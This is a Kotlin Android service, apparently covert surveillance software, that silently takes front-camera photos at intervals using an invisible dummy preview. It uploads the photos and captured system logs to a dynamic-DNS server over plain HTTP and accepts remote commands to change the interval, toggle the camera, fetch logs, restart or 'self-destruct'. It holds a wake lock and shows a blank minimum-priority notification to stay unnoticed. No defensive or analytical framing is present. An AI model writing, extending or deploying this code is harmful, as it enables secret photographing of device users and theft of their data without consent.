package com.example.system

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.SurfaceTexture
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import android.view.Surface
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import androidx.work.WorkManager
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.IOException
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class MonitoringService : LifecycleService() {

    private var imageCapture: ImageCapture? = null
    private lateinit var cameraExecutor: ExecutorService
    private var wakeLock: PowerManager.WakeLock? = null
    private val serverUrl = "http://hc103081.servehttp.com:8080/upload"
    
    private lateinit var statusReporter: StatusReporter
    @Volatile private var successUploadCount = 0
    @Volatile private var currentPhotoInterval = 60 // 預設 60 秒
    @Volatile private var isCapturing = false
    @Volatile private var isShuttingDown = false
    @Volatile private var isCameraEnabled = true // 🌟 相機開關狀態
    
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var photoJob: Job? = null

    companion object {
        private const val TAG = "MonitoringService"
        private const val CHANNEL_ID = "monitoring_channel"
        private const val NOTIFICATION_ID = 1
        var isRunning = false
    }

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        cameraExecutor = Executors.newSingleThreadExecutor()
        statusReporter = StatusReporter(this)
        
        // 綁定遠端指令接收器
        statusReporter.onCommandReceived = { command, value ->
            handleRemoteCommand(command, value)
        }
        
        acquireWakeLock()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        startCamera()
        
        startHeartbeatLoop()
        startPhotoLoop()
    }

    private fun handleRemoteCommand(command: String, value: String) {
        Log.w(TAG, "🎯 開始執行遠端指令: $command, 參數: $value")
        
        when (command) {
            "SET_INTERVAL" -> {
                val newInterval = value.toIntOrNull()
                if (newInterval == null || newInterval < 5) {
                    Log.e(TAG, "❌ 無效的頻率參數: $value")
                    return
                }
                
                currentPhotoInterval = newInterval
                Log.d(TAG, "✅ 頻率已成功更新為: $currentPhotoInterval 秒")
                if (isCameraEnabled) startPhotoLoop() 
                
                statusReporter.sendHeartbeat(successUploadCount, currentPhotoInterval, isCameraEnabled = isCameraEnabled)
            }
            "STOP_SERVICE" -> executeSelfDestruct()
            "RESTART_APP" -> executeRestart()
            "SET_CAMERA_STATE" -> {
                isCameraEnabled = (value == "ON")
                if (isCameraEnabled) {
                    Log.d(TAG, "▶️ 恢復定時拍照")
                    startPhotoLoop()
                } else {
                    Log.d(TAG, "⏸️ 暫停定時拍照")
                    photoJob?.cancel() // 取消拍照任務
                }
                // 立刻發送心跳回報最新狀態
                statusReporter.sendHeartbeat(successUploadCount, currentPhotoInterval, isCameraEnabled = isCameraEnabled)
            }
            "FETCH_LOG" -> fetchAndUploadLog()
            else -> Log.w(TAG, "未知指令: $command")
        }
    }

    private fun startPhotoLoop() {
        photoJob?.cancel()
        if (!isCameraEnabled) return

        photoJob = serviceScope.launch {
            while (imageCapture == null && isActive) {
                Log.d(TAG, "⏳ 拍照任務等待中：相機尚未綁定...")
                delay(2000L)
            }

            while (isActive) {
                if (isRunning && isCameraEnabled) {
                    takePhotoAndUpload()
                }
                delay(currentPhotoInterval * 1000L)
            }
        }
    }

    private fun startHeartbeatLoop() {
        serviceScope.launch {
            while (isActive) {
                Log.d(TAG, "💓 觸發獨立心跳包...")
                statusReporter.sendHeartbeat(successUploadCount, currentPhotoInterval, isCameraEnabled = isCameraEnabled)
                delay(10_000L)
            }
        }
    }

    private fun fetchAndUploadLog() {
        serviceScope.launch(Dispatchers.IO) {
            try {
                Log.d(TAG, "📄 正在擷取系統 Log...")
                // 抓取最近 500 行
                val process = Runtime.getRuntime().exec("logcat -d -t 500")
                val logFile = File(cacheDir, "log_${System.currentTimeMillis()}.txt")
                
                process.inputStream.bufferedReader().use { reader ->
                    logFile.writeText(reader.readText())
                }
                
                Log.d(TAG, "✅ Log 擷取完成，大小: ${logFile.length()} bytes，準備上傳")
                uploadToServer(logFile)
            } catch (e: Exception) {
                Log.e(TAG, "❌ 抓取 Log 失敗", e)
            }
        }
    }

    private fun executeSelfDestruct() {
        if (isShuttingDown) return
        isShuttingDown = true
        Log.w(TAG, "🛑 [自毀程序啟動] 收到遠端停止指令！")
        isRunning = false
        
        photoJob?.cancel()
        serviceScope.cancel()

        CoroutineScope(Dispatchers.IO).launch {
            Log.w(TAG, "📤 正在同步發送最後遺言...")
            statusReporter.sendHeartbeatSync(successUploadCount, currentPhotoInterval, isStopping = true, isCameraEnabled = isCameraEnabled)

            withContext(Dispatchers.Main) {
                try {
                    WorkManager.getInstance(applicationContext).cancelAllWork()
                    stopForeground(STOP_FOREGROUND_REMOVE)
                    wakeLock?.let { if (it.isHeld) it.release() }
                    stopSelf()
                    Log.w(TAG, "⚰️ 服務已成功呼叫 stopSelf()")
                } catch (e: Exception) {
                    Log.e(TAG, "清理程序發生異常", e)
                }
            }
        }
    }

    private fun executeRestart() {
        if (isShuttingDown) return
        isShuttingDown = true
        Log.w(TAG, "🔄[重啟程序啟動] 收到遠端重啟指令！")

        photoJob?.cancel()
        serviceScope.cancel()

        Thread {
            Log.w(TAG, "📤 正在發送重啟確認...")
            statusReporter.sendHeartbeatSync(successUploadCount, currentPhotoInterval, isStopping = false, isRestarting = true, isCameraEnabled = isCameraEnabled)

            Handler(Looper.getMainLooper()).post {
                try {
                    val restartIntent = Intent(applicationContext, MonitoringService::class.java)
                    val pendingIntent = PendingIntent.getService(
                        applicationContext, 12345, restartIntent,
                        PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
                    )

                    val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        if (alarmManager.canScheduleExactAlarms()) {
                            alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, pendingIntent)
                        } else {
                            alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, pendingIntent)
                        }
                    } else {
                        alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, pendingIntent)
                    }

                    stopForeground(STOP_FOREGROUND_REMOVE)
                    stopSelf()
                    android.os.Process.killProcess(android.os.Process.myPid())
                } catch (e: Exception) {
                    Log.e(TAG, "重啟設定失敗", e)
                }
            }
        }.start()
    }

    private fun startCamera() {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        cameraProviderFuture.addListener({
            val cameraProvider: ProcessCameraProvider = cameraProviderFuture.get()
            
            // 🌟 許多裝置在背景拍照時，若沒有 Preview 流，快門會卡住 (等待 AE/AF 收斂)
            // 建立一個不顯示的 Dummy Preview
            val preview = Preview.Builder().build()
            preview.setSurfaceProvider(cameraExecutor) { request ->
                val surfaceTexture = SurfaceTexture(10) // 隨意 ID
                surfaceTexture.setDefaultBufferSize(request.resolution.width, request.resolution.height)
                val surface = Surface(surfaceTexture)
                request.provideSurface(surface, cameraExecutor) {
                    surface.release()
                    surfaceTexture.release()
                }
            }

            val capture = ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MAXIMIZE_QUALITY) // 改用品質模式通常較穩定
                .build()

            val cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA

            try {
                cameraProvider.unbindAll()
                // 同時綁定 Preview 與 ImageCapture
                cameraProvider.bindToLifecycle(this, cameraSelector, preview, capture)
                imageCapture = capture
                Log.d(TAG, "✅ CameraX 已成功綁定 (含 Dummy Preview)")
            } catch (exc: Exception) {
                Log.e(TAG, "❌ 相機啟動失敗", exc)
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun takePhotoAndUpload() {
        if (!isCameraEnabled) return
        
        if (isCapturing) {
            Log.w(TAG, "⚠️ 拍照請求被跳過：上一次拍照尚未完成 (可能卡在快門)")
            return
        }
        
        val imageCapture = imageCapture
        if (imageCapture == null) {
            Log.e(TAG, "❌ 拍照失敗：imageCapture 為空")
            return
        }

        cleanUpOldFiles(cacheDir)
        
        isCapturing = true
        Log.d(TAG, "📸 準備按下快門...")

        val photoFile = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
        val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

        try {
            imageCapture.takePicture(
                outputOptions,
                cameraExecutor,
                object : ImageCapture.OnImageSavedCallback {
                    override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                        isCapturing = false
                        Log.d(TAG, "✅ 拍照成功: ${photoFile.name}")
                        uploadToServer(photoFile)
                    }

                    override fun onError(exc: ImageCaptureException) {
                        isCapturing = false
                        Log.e(TAG, "❌ 拍照失敗 [Code: ${exc.imageCaptureError}]: ${exc.message}", exc)
                    }
                }
            )
        } catch (e: Exception) {
            isCapturing = false
            Log.e(TAG, "❌ 呼叫 takePicture 發生異常", e)
        }
    }

    private fun uploadToServer(file: File) {
        val client = OkHttpClient()
        
        // 確保 if-else 結構完整
        val mediaTypeStr = if (file.name.endsWith(".txt")) "text/plain" else "image/jpeg"
        val mediaType = mediaTypeStr.toMediaTypeOrNull()

        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("file", file.name, file.asRequestBody(mediaType))
            .build()

        val request = Request.Builder().url(serverUrl).post(requestBody).build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "❌ 上傳失敗 | 檔案: ${file.name} | 原因: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                response.use { resp ->
                    if (resp.isSuccessful) {
                        Log.d(TAG, "🚀 上傳成功: ${file.name}")
                        if (file.exists()) file.delete()
                        if (file.name.endsWith(".jpg")) {
                            successUploadCount++
                        }
                    } else {
                        Log.e(TAG, "⚠️ 上傳失敗，狀態碼: ${resp.code}")
                    }
                    // 🌟 明確回傳 Unit，確保 if 不會被當作 lambda 的表達式回傳值
                    @Suppress("UNUSED_EXPRESSION")
                    Unit
                }
            }
        })
    }

    private fun cleanUpOldFiles(directory: File, maxSizeMB: Int = 50) {
        if (!directory.exists() || !directory.isDirectory) return
        val files = directory.listFiles() ?: return
        var totalSizeBytes = files.sumOf { it.length() }
        val maxSizeBytes = maxSizeMB * 1024 * 1024L
        if (totalSizeBytes <= maxSizeBytes) return

        val sortedFiles = files.sortedBy { it.lastModified() }
        for (file in sortedFiles) {
            if (totalSizeBytes <= maxSizeBytes) break
            val fileSize = file.length()
            if (file.delete()) {
                totalSizeBytes -= fileSize
            }
        }
    }

    private fun acquireWakeLock() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MonitoringService::WakeLock").apply {
            acquire(24 * 60 * 60 * 1000L)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "即時監控服務", NotificationManager.IMPORTANCE_MIN)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.min)
            .setShowWhen(false)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setContentIntent(pendingIntent)
            .build()
    }

    override fun onDestroy() {
        if (!isShuttingDown) {
            isShuttingDown = true
            Thread {
                statusReporter.sendHeartbeatSync(successUploadCount, currentPhotoInterval, isStopping = true, isCameraEnabled = isCameraEnabled)
            }.start()
        }
        isRunning = false
        serviceScope.cancel()
        photoJob?.cancel()
        wakeLock?.let { if (it.isHeld) it.release() }
        cameraExecutor.shutdown()
        super.onDestroy()
    }
}
